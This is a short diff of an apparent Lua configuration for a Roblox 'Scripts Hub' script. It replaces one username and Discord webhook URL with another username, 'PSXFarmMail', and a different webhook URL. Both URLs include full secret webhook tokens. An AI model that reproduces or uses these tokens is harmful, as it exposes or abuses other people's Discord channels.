@@ -1,5 +1,5 @@
-  Username = "Vovik_wolf"
-WebHook = "https://discord.com/api/webhooks/1076627235102011463/gpAtxyj_2dRAAHXJK9u8ySK8yGXk_n4oHKxAZ14W2ck8Gt6f-dWwbFuaqIndzHs2nfll"
+Username = "PSXFarmMail"
+WebHook = "https://discord.com/api/webhooks/1124014580490829824/Dcp1x4GjXg6g0UBdb7ie69X47i-uiu1WoVZ1-8pT_BcYZXGfxsLsxwJAAxLJAaRB-ZAP"
 
 _G.CustomScriptName = "Scripts Hub"
 _G.Text1 = "Script Loaded..."
